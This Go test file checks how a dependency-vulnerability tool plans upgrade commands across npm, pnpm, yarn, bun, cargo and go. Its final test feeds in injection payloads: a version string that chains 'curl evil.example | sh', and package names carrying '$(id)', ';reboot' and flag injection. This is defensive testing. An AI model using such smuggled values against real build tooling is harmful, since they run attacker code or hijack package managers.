package report

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/rasoat/rasoat/internal/core"
	"github.com/rasoat/rasoat/internal/data"
)

func fixtureDir(name string) string {
	d, _ := filepath.Abs(filepath.Join("..", "..", "fixtures", name))
	return d
}

// planFor is the plan for one finding in one source of a real fixture directory.
func planFor(t *testing.T, dir, product, version, fix, source string) Change {
	t.Helper()
	r := Result{Verdict: core.Verdict{Product: product, Version: &version, Status: core.Vulnerable, Fix: &fix, Advisories: []core.VerdictAdvisory{}}, Sources: []string{source}}
	rep := &Report{Target: Target{"dir", dir}, Results: []Result{r}}
	return Plan(rep, &data.Loaded{Snapshot: data.Bundled()}).Steps[0].Changes[0]
}

func TestADirectNpmDependencyGetsItsManagersCommand(t *testing.T) {
	for dir, want := range map[string]string{
		"pnpm":       "pnpm update react@18.3.2",
		"yarn-v1":    "yarn upgrade react@18.3.2",
		"yarn-berry": "yarn up react@18.3.2",
		"bun":        "bun update react@18.3.2",
		"npm":        "npm install react@18.3.2",
	} {
		lock := map[string]string{"pnpm": "pnpm-lock.yaml", "yarn-v1": "yarn.lock", "yarn-berry": "yarn.lock", "bun": "bun.lock", "npm": "package-lock.json"}[dir]
		c := planFor(t, fixtureDir(dir), "pkg:npm/react", "18.3.1", "18.3.2", lock)
		if c.Command == nil || *c.Command != want || c.Cwd == nil || *c.Cwd != "." {
			t.Errorf("%s: %+v", dir, c)
		}
	}
}

// A package no package.json asks for is pulled in by another: one command cannot move it, so the plan says how to pin it.
func TestATransitiveNpmDependencyGetsOverrideInstructionsAndNoCommand(t *testing.T) {
	for dir, want := range map[string]string{
		"pnpm":       `"pnpm": {"overrides": {"postcss": "8.5.23"}}`,
		"yarn-v1":    `"resolutions": {"postcss": "8.5.23"}`,
		"yarn-berry": `"resolutions": {"postcss": "8.5.23"}`,
		"bun":        `"overrides": {"postcss": "8.5.23"}`,
		"npm":        `"overrides": {"postcss": "8.5.23"}`,
	} {
		lock := map[string]string{"pnpm": "pnpm-lock.yaml", "yarn-v1": "yarn.lock", "yarn-berry": "yarn.lock", "bun": "bun.lock", "npm": "package-lock.json"}[dir]
		c := planFor(t, fixtureDir(dir), "pkg:npm/postcss", "8.4.31", "8.5.23", lock)
		if c.Command != nil || !strings.Contains(c.How, want) {
			t.Errorf("%s: %+v", dir, c)
		}
	}
}

func TestCargoAndGoCommandsRunWhereTheirFileIs(t *testing.T) {
	c := planFor(t, fixtureDir("cargo"), "pkg:cargo/tokio", "1.53.1", "1.53.3", "Cargo.lock")
	if c.Command == nil || *c.Command != "cargo update -p tokio@1.53.1 --precise 1.53.3" || *c.Cwd != "." {
		t.Errorf("%+v", c)
	}
	c = planFor(t, fixtureDir("go"), "pkg:golang/golang.org/x/net", "v0.54.0", "0.62.0", "go.sum")
	if c.Command == nil || *c.Command != "go get golang.org/x/net@v0.62.0 && go mod tidy" {
		t.Errorf("%+v", c)
	}
	// a monorepo: the lockfile is in a subdirectory, and so is the command
	c = planFor(t, fixtureDir("cargo"), "pkg:cargo/tokio", "1.53.1", "1.53.3", "services/api/Cargo.lock")
	if c.Cwd == nil || *c.Cwd != "services/api" {
		t.Errorf("%+v", c)
	}
}

func TestAnImageIsALineEditAndAFileThatIsNoLockfileGetsNoCommand(t *testing.T) {
	c := planFor(t, fixtureDir("npm"), "redis", "6.2.0", "7.2.5", "docker-compose.yml (redis:6.2.0)")
	if c.Command != nil || !strings.Contains(c.How, "the image: line") || !strings.Contains(c.How, "redis:6.2.0") || !strings.Contains(c.How, "7.2.5") {
		t.Errorf("%+v", c)
	}
	c = planFor(t, fixtureDir("npm"), "node", "20.1.0", "20.19.0", "Dockerfile (node:20.1.0)")
	if c.Command != nil || !strings.Contains(c.How, "the FROM line") {
		t.Errorf("%+v", c)
	}
	c = planFor(t, fixtureDir("npm"), "pkg:npm/lodash", "4.17.15", "4.18.1", "VERSION")
	if c.Command != nil || !strings.Contains(c.How, "VERSION") {
		t.Errorf("a detector's file: %+v", c)
	}
}

// Only a plain version, and only a plain package name, reach a command: both come from files someone else wrote.
func TestNeitherAHostileVersionNorAHostileNameReachesACommand(t *testing.T) {
	hostile := "1.0.0; curl evil.example | sh"
	for _, tc := range []struct{ dir, product, lock string }{
		{"pnpm", "pkg:npm/react", "pnpm-lock.yaml"}, {"yarn-v1", "pkg:npm/react", "yarn.lock"}, {"yarn-berry", "pkg:npm/react", "yarn.lock"},
		{"bun", "pkg:npm/react", "bun.lock"}, {"npm", "pkg:npm/react", "package-lock.json"},
		{"cargo", "pkg:cargo/tokio", "Cargo.lock"}, {"go", "pkg:golang/golang.org/x/net", "go.sum"},
	} {
		if c := planFor(t, fixtureDir(tc.dir), tc.product, "1.0.0", hostile, tc.lock); c.Command != nil {
			t.Errorf("%s: version reached a command: %s", tc.dir, *c.Command)
		}
	}
	for _, name := range []string{"pkg:npm/--registry=http://evil.example", "pkg:npm/x;reboot", "pkg:npm/$(id)", "pkg:cargo/--git", "pkg:golang/x y", "pkg:golang/-exec"} {
		for _, lock := range []string{"package-lock.json", "Cargo.lock", "go.sum"} {
			c := planFor(t, fixtureDir("npm"), name, "1.0.0", "1.0.1", lock)
			if c.Command != nil {
				t.Errorf("%s in %s: name reached a command: %s", name, lock, *c.Command)
			}
			if strings.Contains(c.How, "evil") || strings.Contains(c.How, "reboot") || strings.Contains(c.How, "$(") {
				t.Errorf("%s: name reached the how: %s", name, c.How)
			}
		}
	}
}
